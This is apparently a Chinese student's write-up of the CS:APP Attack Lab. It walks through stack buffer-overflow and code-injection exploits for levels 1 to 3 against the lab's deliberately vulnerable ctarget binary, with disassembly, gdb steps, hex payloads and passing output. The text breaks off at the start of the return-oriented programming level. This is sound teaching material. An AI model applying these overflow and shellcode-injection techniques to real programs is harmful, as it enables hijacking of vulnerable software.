<h3 id="·-第一关："><a href="#·-第一关：" class="headerlink" title="· 第一关："></a>· 第一关：</h3><ul>
<li><p>第一关不需要注入新的代码，只需要利用输入的字符串控制函数的执行流程，使它跳转到<code>touch1</code>函数并执行。</p>
</li>
<li><p>函数<code>getbuf</code>在 test 函数中被调用：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    val = getbuf();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;No exploit. Getbuf returned 0x%x\n&quot;</span>, val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当<code>getbuf</code>函数执行<code>return</code>语句返回时，会恢复到<code>test</code>函数继续执行<code>printf</code>语句。</p>
</li>
<li><p>在<code>ctarget</code>中有一个函数<code>touch1</code>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">touch1</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    vlevel = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Touch1!: You called touch1()\n&quot;</span>);</span><br><span class="line">    validate(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>第一关的任务是使<code>getbuf</code>返回时跳转到<code>touch1</code>函数开始执行，而不是返回到<code>test</code>函数继续执行</p>
</li>
<li><p>找到<code>getbuf</code>函数的反汇编代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000401e92 &lt;getbuf&gt;:</span><br><span class="line">  401e92:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401e96:	48 83 ec 18          	sub    $0x18,%rsp</span><br><span class="line">  401e9a:	48 89 e7             	mov    %rsp,%rdi</span><br><span class="line">  401e9d:	e8 b5 02 00 00       	callq  402157 &lt;Gets&gt;</span><br><span class="line">  401ea2:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line">  401ea7:	48 83 c4 18          	add    $0x18,%rsp</span><br><span class="line">  401eab:	c3                   	retq   </span><br></pre></td></tr></table></figure>
</li>
<li><p>显然，这一阶段不需要注入新的代码，只需要用攻击字符串覆盖<code>getbuf</code>的返回值，即使<code>getbuf</code>结尾处的<code>ret指令</code>将控制转移到<code>touch1</code>。</p>
</li>
<li><p>从第二行指令<code>sub $0x18,%rsp</code>可以得出<code>getbuf</code>创建的缓冲区大小为<code>0x18</code>字节。</p>
</li>
<li><p>再查看<code>touch1</code>的反汇编：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000401eac &lt;touch1&gt;:</span><br><span class="line">  401eac:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401eb0:	50                   	push   %rax</span><br><span class="line">  401eb1:	58                   	pop    %rax</span><br><span class="line">  401eb2:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  401eb6:	c7 05 3c 56 00 00 01 	movl   $0x1,0x563c(%rip)        # 4074fc &lt;vlevel&gt;</span><br><span class="line">  401ebd:	00 00 00 </span><br><span class="line">  401ec0:	48 8d 3d 71 24 00 00 	lea    0x2471(%rip),%rdi        # 404338 &lt;_IO_stdin_used+0x338&gt;</span><br><span class="line">  401ec7:	e8 c4 f3 ff ff       	callq  401290 &lt;puts@plt&gt;</span><br><span class="line">  401ecc:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  401ed1:	e8 f4 04 00 00       	callq  4023ca &lt;validate&gt;</span><br><span class="line">  401ed6:	bf 00 00 00 00       	mov    $0x0,%edi</span><br><span class="line">  401edb:	e8 10 f5 ff ff       	callq  4013f0 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>发现<code>touch1</code>的首地址是<code>0x401eac</code>。</p>
</li>
<li><p>由此就有了思路，我们只需要输入25个字符，前24个字节将<code>getbuf</code>的栈空间填满，最后一个字节将返回值覆盖为<code>0x4017c0</code>即<code>touch1</code>的地址，这样，在<code>getbuf</code>执行<code>retq</code>指令后，程序就会跳转执行<code>touch1</code>函数。</p>
</li>
<li><p>采用<code>Write up</code>推荐方法，创建一个<code>txt</code>文档存储输入。并按照<code>HEX2RAW</code>工具的说明，在每个字节间用空格或回车隔开。注意我们这里要用小端法，即输入的字符串要写成<code>ac 1e 40</code>这样，开辟的24字节空间里面填什么无所谓。最后我们可以填成这样：</p>
<p><code>level1.txt</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">//以上字符是填充满整个缓冲区(24字节)从而溢出</span><br><span class="line">ac 1e 40 00 00 00 00 00</span><br><span class="line">//用函数touch1的起始地址覆盖原先的返回地址</span><br></pre></td></tr></table></figure>
</li>
<li><p>调用<code>hex2raw</code>生成攻击字符串，并攻击<code>ctarget</code>。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ouc@islouc-vm:~/Desktop/target393$ ./hex2raw &lt; level1.txt &gt; level1raw.txt</span><br><span class="line">ouc@islouc-vm:~/Desktop/target393$ ./ctarget -qi level1raw.txt</span><br><span class="line"></span><br><span class="line">Cookie: 0x175f75bc</span><br><span class="line">Touch1!: You called touch1()</span><br><span class="line">Valid solution <span class="keyword">for</span> level 1 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">	user <span class="built_in">id</span>	22090001016</span><br><span class="line">	course	15213-f15</span><br><span class="line">	lab	attacklab</span><br><span class="line">	result	393:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AC 1E 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>
<p><img src="/img/jj/attacklab/1.png" alt="img"></p>
</li>
</ul>
<h3 id="·-第二关："><a href="#·-第二关：" class="headerlink" title="· 第二关："></a>· 第二关：</h3><ul>
<li><p>第⼆关需要注入少量代码作为漏洞注入字符串的一部分</p>
</li>
<li><p>在<code>ctarget</code>中有一个函数<code>touch2</code>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">touch2</span><span class="params">(<span class="type">unsigned</span> val)</span></span><br><span class="line">&#123;</span><br><span class="line">    vlevel = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> (val == cookie) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Touch2!: You called touch2(0x%.8x)\n&quot;</span>, val);</span><br><span class="line">    validate(<span class="number">2</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Touch2!: You called touch2(0x%.8x)\n&quot;</span>, val);</span><br><span class="line">    fail(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>第⼆关的任务是使<code>getbuf</code>返回时跳转到<code>touch2</code>函数开始执行，而不是返回到<code>test</code>函数继续执行，与<code>touch1</code>不同的是<code>touch2</code>需要将<code>cookie</code>作为参数传递，即<code>0x175f75bc</code>。</p>
</li>
<li><p>查看<code>touch2</code>的反汇编：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000401ee0 &lt;touch2&gt;:</span><br><span class="line">  401ee0:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401ee4:	50                   	push   %rax</span><br><span class="line">  401ee5:	58                   	pop    %rax</span><br><span class="line">  401ee6:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  401eea:	89 fa                	mov    %edi,%edx</span><br><span class="line">  401eec:	c7 05 06 56 00 00 02 	movl   $0x2,0x5606(%rip)        # 4074fc &lt;vlevel&gt;</span><br><span class="line">  401ef3:	00 00 00 </span><br><span class="line">  401ef6:	39 3d 08 56 00 00    	cmp    %edi,0x5608(%rip)        # 407504 &lt;cookie&gt;</span><br><span class="line">  401efc:	74 2a                	je     401f28 &lt;touch2+0x48&gt;</span><br><span class="line">  401efe:	48 8d 35 83 24 00 00 	lea    0x2483(%rip),%rsi        # 404388 &lt;_IO_stdin_used+0x388&gt;</span><br><span class="line">  401f05:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  401f0a:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401f0f:	e8 8c f4 ff ff       	callq  4013a0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  401f14:	bf 02 00 00 00       	mov    $0x2,%edi</span><br><span class="line">  401f19:	e8 80 05 00 00       	callq  40249e &lt;fail&gt;</span><br><span class="line">  401f1e:	bf 00 00 00 00       	mov    $0x0,%edi</span><br><span class="line">  401f23:	e8 c8 f4 ff ff       	callq  4013f0 &lt;exit@plt&gt;</span><br><span class="line">  401f28:	48 8d 35 31 24 00 00 	lea    0x2431(%rip),%rsi        # 404360 &lt;_IO_stdin_used+0x360&gt;</span><br><span class="line">  401f2f:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  401f34:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401f39:	e8 62 f4 ff ff       	callq  4013a0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  401f3e:	bf 02 00 00 00       	mov    $0x2,%edi</span><br><span class="line">  401f43:	e8 82 04 00 00       	callq  4023ca &lt;validate&gt;</span><br><span class="line">  401f48:	eb d4                	jmp    401f1e &lt;touch2+0x3e&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>函数的第一个参数放在<code>%rdi</code>寄存器里面，显然，这里我们不能直接输入字符串，需要借助汇编语言来实现。具体解题思路如下：</p>
<ul>
<li>将正常的返回地址设置成为注入代码的地址，这次注入直接在栈顶注入，即设置为<code>%rsp</code></li>
<li><code>cookie</code>的值写在<code>%rdi</code>里</li>
<li>获取<code>touch2</code>的首地址，即<code>0x401ee0</code></li>
<li>要调用<code>touch2</code>，却不能用<code>call</code> <code>jmp</code>等命令，所以只能用<code>ret</code>弹出，在弹出之前要先把<code>touch2</code>地址压栈。</li>
</ul>
</li>
<li><p>即我们的汇编代码为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov	$0x175f75bc, %rdi</span><br><span class="line">pushq	$0x401ee0</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
</li>
<li><p>命令行里编译再查看其反汇编：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ouc@islouc-vm:~/Desktop/target393$ gcc -c attack2.s</span><br><span class="line">ouc@islouc-vm:~/Desktop/target393$ objdump -d attack2.o &gt; attack2.txt</span><br></pre></td></tr></table></figure>
</li>
<li><p>查看<code>attack2.txt</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">attack2.o:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:	48 c7 c7 bc 75 5f 17 	mov    $0x175f75bc,%rdi</span><br><span class="line">   7:	68 e0 1e 40 00       	pushq  $0x401ee0</span><br><span class="line">   c:	c3                   	retq   </span><br></pre></td></tr></table></figure>
</li>
<li><p>观察<code>getbuf</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000401e92 &lt;getbuf&gt;:</span><br><span class="line">  401e92:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401e96:	48 83 ec 18          	sub    $0x18,%rsp</span><br><span class="line">  401e9a:	48 89 e7             	mov    %rsp,%rdi</span><br><span class="line">  401e9d:	e8 b5 02 00 00       	callq  402157 &lt;Gets&gt;</span><br><span class="line">  401ea2:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line">  401ea7:	48 83 c4 18          	add    $0x18,%rsp</span><br><span class="line">  401eab:	c3                   	retq   </span><br></pre></td></tr></table></figure>
</li>
<li><p>这三条指令地址我们就有了，就是每行反汇编最前面的一长串十六进制数字，接着我们去找<code>%rsp</code>在哪，借助<code>gdb</code>。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ouc@islouc-vm:~/Desktop/target393$ gdb ctarget</span><br><span class="line"></span><br><span class="line">pwndbg&gt; b *0x401ea2</span><br><span class="line"></span><br><span class="line">pwndbg&gt; run -q</span><br><span class="line"></span><br><span class="line">pwndbg&gt; p/x <span class="variable">$rsp</span></span><br></pre></td></tr></table></figure>
<p><img src="/img/jj/attacklab/2.png" alt="img"></p>
<p><img src="/img/jj/attacklab/3.png" alt="img"></p>
</li>
<li><p><code>0x55613b18</code>就是我们应该修改的返回地址</p>
</li>
<li><p>将这段代码放到40个字节中的开头，代码地址放到末尾。于是就得到输入为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">48 c7 c7 bc 75 5f 17 68 </span><br><span class="line">e0 1e 40 00 c3 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">18 3b 61 55 00 00 00 00</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用<code>hex2raw</code>生成攻击字符串，并攻击<code>ctarget</code>。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ouc@islouc-vm:~/Desktop/target393$ ./hex2raw &lt; level2.txt &gt; level2raw.txt</span><br><span class="line">ouc@islouc-vm:~/Desktop/target393$ ./ctarget -qi level2raw.txt</span><br><span class="line"></span><br><span class="line">Cookie: 0x175f75bc</span><br><span class="line">Touch2!: You called touch2(0x175f75bc)</span><br><span class="line">Valid solution <span class="keyword">for</span> level 2 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">	user <span class="built_in">id</span>	22090001016</span><br><span class="line">	course	15213-f15</span><br><span class="line">	lab	attacklab</span><br><span class="line">	result	393:PASS:0xffffffff:ctarget:2:48 C7 C7 BC 75 5F 17 68 E0 1E 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 18 3B 61 55 00 00 00 00 </span><br></pre></td></tr></table></figure>
<p><img src="/img/jj/attacklab/4.png" alt="img"></p>
</li>
</ul>
<h3 id="·-第三关："><a href="#·-第三关：" class="headerlink" title="· 第三关："></a>· 第三关：</h3><ul>
<li><p>第三关也需要注入代码</p>
</li>
<li><p>在<code>ctarget</code>中有函数<code>hexmatch</code>和<code>touch1</code>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Compare string to hex represention of unsigned value */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">hexmatch</span><span class="params">(<span class="type">unsigned</span> val, <span class="type">char</span> *sval)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line">    <span class="comment">/* Make position of check string unpredictable */</span></span><br><span class="line">    <span class="type">char</span> *s = cbuf + random() % <span class="number">100</span>;</span><br><span class="line">    <span class="built_in">sprintf</span>(s, <span class="string">&quot;%.8x&quot;</span>, val);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">touch3</span><span class="params">(<span class="type">char</span> *sval)</span></span><br><span class="line">&#123;</span><br><span class="line">    vlevel = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span> (hexmatch(cookie, sval)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Touch3!: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line">        validate(<span class="number">3</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line">        fail(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>第三关的任务是使<code>getbuf</code>返回时跳转到<code>touch3</code>函数开始执行，而不是返回到<code>test</code>函数继续<br>执行，与<code>touch2</code>不同的是<code>touch3</code>需要将<code>cookie</code>的字符串形式作为参数传递</p>
</li>
<li><p>查看<code>touch3</code>的反汇编：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000402005 &lt;touch3&gt;:</span><br><span class="line">  402005:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  402009:	53                   	push   %rbx</span><br><span class="line">  40200a:	48 89 fb             	mov    %rdi,%rbx</span><br><span class="line">  40200d:	c7 05 e5 54 00 00 03 	movl   $0x3,0x54e5(%rip)        # 4074fc &lt;vlevel&gt;</span><br><span class="line">  402014:	00 00 00 </span><br><span class="line">  402017:	48 89 fe             	mov    %rdi,%rsi</span><br><span class="line">  40201a:	8b 3d e4 54 00 00    	mov    0x54e4(%rip),%edi        # 407504 &lt;cookie&gt;</span><br><span class="line">  402020:	e8 25 ff ff ff       	callq  401f4a &lt;hexmatch&gt;</span><br><span class="line">  402025:	85 c0                	test   %eax,%eax</span><br><span class="line">  402027:	74 2d                	je     402056 &lt;touch3+0x51&gt;</span><br><span class="line">  402029:	48 89 da             	mov    %rbx,%rdx</span><br><span class="line">  40202c:	48 8d 35 7d 23 00 00 	lea    0x237d(%rip),%rsi        # 4043b0 &lt;_IO_stdin_used+0x3b0&gt;</span><br><span class="line">  402033:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  402038:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  40203d:	e8 5e f3 ff ff       	callq  4013a0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  402042:	bf 03 00 00 00       	mov    $0x3,%edi</span><br><span class="line">  402047:	e8 7e 03 00 00       	callq  4023ca &lt;validate&gt;</span><br><span class="line">  40204c:	bf 00 00 00 00       	mov    $0x0,%edi</span><br><span class="line">  402051:	e8 9a f3 ff ff       	callq  4013f0 &lt;exit@plt&gt;</span><br><span class="line">  402056:	48 89 da             	mov    %rbx,%rdx</span><br><span class="line">  402059:	48 8d 35 78 23 00 00 	lea    0x2378(%rip),%rsi        # 4043d8 &lt;_IO_stdin_used+0x3d8&gt;</span><br><span class="line">  402060:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  402065:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  40206a:	e8 31 f3 ff ff       	callq  4013a0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  40206f:	bf 03 00 00 00       	mov    $0x3,%edi</span><br><span class="line">  402074:	e8 25 04 00 00       	callq  40249e &lt;fail&gt;</span><br><span class="line">  402079:	eb d1                	jmp    40204c &lt;touch3+0x47&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>再查看<code>hexmatch</code>的反汇编：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000401f4a &lt;hexmatch&gt;:</span><br><span class="line">  401f4a:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  401f4e:	41 55                	push   %r13</span><br><span class="line">  401f50:	41 54                	push   %r12</span><br><span class="line">  401f52:	55                   	push   %rbp</span><br><span class="line">  401f53:	53                   	push   %rbx</span><br><span class="line">  401f54:	48 81 ec 88 00 00 00 	sub    $0x88,%rsp</span><br><span class="line">  401f5b:	89 fd                	mov    %edi,%ebp</span><br><span class="line">  401f5d:	48 89 f3             	mov    %rsi,%rbx</span><br><span class="line">  401f60:	41 bc 28 00 00 00    	mov    $0x28,%r12d</span><br><span class="line">  401f66:	64 49 8b 04 24       	mov    %fs:(%r12),%rax</span><br><span class="line">  401f6b:	48 89 44 24 78       	mov    %rax,0x78(%rsp)</span><br><span class="line">  401f70:	31 c0                	xor    %eax,%eax</span><br><span class="line">  401f72:	e8 f9 f3 ff ff       	callq  401370 &lt;random@plt&gt;</span><br><span class="line">  401f77:	48 89 c1             	mov    %rax,%rcx</span><br><span class="line">  401f7a:	48 ba 0b d7 a3 70 3d 	movabs $0xa3d70a3d70a3d70b,%rdx</span><br><span class="line">  401f81:	0a d7 a3 </span><br><span class="line">  401f84:	48 f7 ea             	imul   %rdx</span><br><span class="line">  401f87:	48 01 ca             	add    %rcx,%rdx</span><br><span class="line">  401f8a:	48 c1 fa 06          	sar    $0x6,%rdx</span><br><span class="line">  401f8e:	48 89 c8             	mov    %rcx,%rax</span><br><span class="line">  401f91:	48 c1 f8 3f          	sar    $0x3f,%rax</span><br><span class="line">  401f95:	48 29 c2             	sub    %rax,%rdx</span><br><span class="line">  401f98:	48 8d 04 92          	lea    (%rdx,%rdx,4),%rax</span><br><span class="line">  401f9c:	48 8d 04 80          	lea    (%rax,%rax,4),%rax</span><br><span class="line">  401fa0:	48 c1 e0 02          	shl    $0x2,%rax</span><br><span class="line">  401fa4:	48 29 c1             	sub    %rax,%rcx</span><br><span class="line">  401fa7:	4c 8d 2c 0c          	lea    (%rsp,%rcx,1),%r13</span><br><span class="line">  401fab:	41 89 e8             	mov    %ebp,%r8d</span><br><span class="line">  401fae:	48 8d 0d a0 23 00 00 	lea    0x23a0(%rip),%rcx        # 404355 &lt;_IO_stdin_used+0x355&gt;</span><br><span class="line">  401fb5:	48 c7 c2 ff ff ff ff 	mov    $0xffffffffffffffff,%rdx</span><br><span class="line">  401fbc:	be 01 00 00 00       	mov    $0x1,%esi</span><br><span class="line">  401fc1:	4c 89 ef             	mov    %r13,%rdi</span><br><span class="line">  401fc4:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401fc9:	e8 62 f4 ff ff       	callq  401430 &lt;__sprintf_chk@plt&gt;</span><br><span class="line">  401fce:	ba 09 00 00 00       	mov    $0x9,%edx</span><br><span class="line">  401fd3:	4c 89 ee             	mov    %r13,%rsi</span><br><span class="line">  401fd6:	48 89 df             	mov    %rbx,%rdi</span><br><span class="line">  401fd9:	e8 92 f2 ff ff       	callq  401270 &lt;strncmp@plt&gt;</span><br><span class="line">  401fde:	85 c0                	test   %eax,%eax</span><br><span class="line">  401fe0:	0f 94 c0             	sete   %al</span><br><span class="line">  401fe3:	48 8b 5c 24 78       	mov    0x78(%rsp),%rbx</span><br><span class="line">  401fe8:	64 49 33 1c 24       	xor    %fs:(%r12),%rbx</span><br><span class="line">  401fed:	75 11                	jne    402000 &lt;hexmatch+0xb6&gt;</span><br><span class="line">  401fef:	0f b6 c0             	movzbl %al,%eax</span><br><span class="line">  401ff2:	48 81 c4 88 00 00 00 	add    $0x88,%rsp</span><br><span class="line">  401ff9:	5b                   	pop    %rbx</span><br><span class="line">  401ffa:	5d                   	pop    %rbp</span><br><span class="line">  401ffb:	41 5c                	pop    %r12</span><br><span class="line">  401ffd:	41 5d                	pop    %r13</span><br><span class="line">  401fff:	c3                   	retq   </span><br><span class="line">  402000:	e8 ab f2 ff ff       	callq  4012b0 &lt;__stack_chk_fail@plt&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>同时，<code>test</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">000000000040207b &lt;test&gt;:</span><br><span class="line">  40207b:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  40207f:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  402083:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  402088:	e8 05 fe ff ff       	callq  401e92 &lt;getbuf&gt;</span><br><span class="line">  40208d:	89 c2                	mov    %eax,%edx</span><br><span class="line">  40208f:	48 8d 35 6a 23 00 00 	lea    0x236a(%rip),%rsi        # 404400 &lt;_IO_stdin_used+0x400&gt;</span><br><span class="line">  402096:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  40209b:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  4020a0:	e8 fb f2 ff ff       	callq  4013a0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  4020a5:	48 83 c4 08          	add    $0x8,%rsp</span><br><span class="line">  4020a9:	c3                   	retq   </span><br></pre></td></tr></table></figure>
</li>
<li><p>同理，借助<code>gdb</code>查看调用<code>hexmatch</code>， <code>0x55613b40</code>就是我们应该修改的返回地址</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ouc@islouc-vm:~/Desktop/target393$ gdb ctarget</span><br><span class="line"></span><br><span class="line">pwndbg&gt; b *0x402083</span><br><span class="line"></span><br><span class="line">pwndbg&gt; run -q</span><br><span class="line"></span><br><span class="line">pwndbg&gt; p/x <span class="variable">$rsp</span></span><br></pre></td></tr></table></figure>
<p><img src="/img/jj/attacklab/5.png" alt="img"></p>
</li>
<li><p>而<code>touch3</code>的起始地址为<code>0x402005</code></p>
</li>
<li><p>新建<code>attack3.s</code>储存</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov	$0x55613b38, %rdi</span><br><span class="line">pushq	$0x402005</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
</li>
<li><p>命令行里编译再查看其反汇编：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ouc@islouc-vm:~/Desktop/target393$ gcc -c attack3.s</span><br><span class="line">ouc@islouc-vm:~/Desktop/target393$ objdump -d attack3.o &gt; attack3.txt</span><br></pre></td></tr></table></figure>
</li>
<li><p>查看<code>attack3.txt</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">attack3.o:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:	48 c7 c7 38 3b 61 55 	mov    $0x55613b38,%rdi</span><br><span class="line">   7:	68 05 20 40 00       	pushq  $0x402005</span><br><span class="line">   c:	c3                   	retq   </span><br></pre></td></tr></table></figure>
</li>
<li><p><code>cookie</code>值<code>0x175f75bc</code>的 ACSII码 为<code>31 37 35 66 37 35 62 63 00</code>，末尾的<code>00</code>是字符串结束标识符<code>\n</code>。</p>
</li>
<li><p>故，攻击字符串<code>level3.txt</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">48 c7 c7 38 3b 61 55 68 </span><br><span class="line">05 20 40 00 c3 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">//以上包含注入代码填充满整个缓冲区(24字节)从而溢出</span><br><span class="line">18 3b 61 55 00 00 00 00 </span><br><span class="line">//用缓冲区的起始地址覆盖原先的返回地址</span><br><span class="line">31 37 35 66 37 35 62 63 00</span><br><span class="line">//cookie值的ACSII码</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用<code>hex2raw</code>生成攻击字符串，并攻击<code>ctarget</code>。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ouc@islouc-vm:~/Desktop/target393$ ./hex2raw &lt; level3.txt &gt; level3raw.txt</span><br><span class="line">ouc@islouc-vm:~/Desktop/target393$ ./ctarget -qi level3raw.txt</span><br><span class="line"></span><br><span class="line">Cookie: 0x175f75bc</span><br><span class="line">Touch3!: You called touch3(<span class="string">&quot;175f75bc&quot;</span>)</span><br><span class="line">Valid solution <span class="keyword">for</span> level 3 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">	user <span class="built_in">id</span>	22090001016</span><br><span class="line">	course	15213-f15</span><br><span class="line">	lab	attacklab</span><br><span class="line">	result	393:PASS:0xffffffff:ctarget:3:48 C7 C7 38 3B 61 55 68 05 20 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 18 3B 61 55 00 00 00 00 31 37 35 66 37 35 62 63 00 </span><br></pre></td></tr></table></figure>
<p><img src="/img/jj/attacklab/6.png" alt="img"></p>
</li>
</ul>
<h3 id="·-第四关："><a href="#·-第四关：" class="headerlink" title="· 第四关："></a>· 第四关：</h3><ul>
<li><p>要求：</p>
<ol>
<li>只能使用前八个x86-64寄存器 <code>%rax-%rdi</code> ；</li>
<li>只能使用 <code>movq</code>， <code>popq</code>， <code>ret</code>， <code>nop</code>的 <code>gadget</code>；</li>
<li>只能使用两个 <code>gadget</code>完成攻击；</li>
</ol>
</li>
<li><p>本题的任务与<code>Phase 2</code>相同，都是要求返回到<code>touch2</code>函数，<code>Phase 2</code>中用到的注入代码为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov	$0x175f75bc, %rdi</span><br><span class="line">pushq	$0x401ee0</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
</li>
<li><p>我们先把<code>rtarget</code>反汇编文件弄出来</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">objdump -d rtarget &gt; r.txt</span><br></pre></td></tr></table></figure>
</li>
<li><p>跟<code>farm</code>有关的部分：</p>
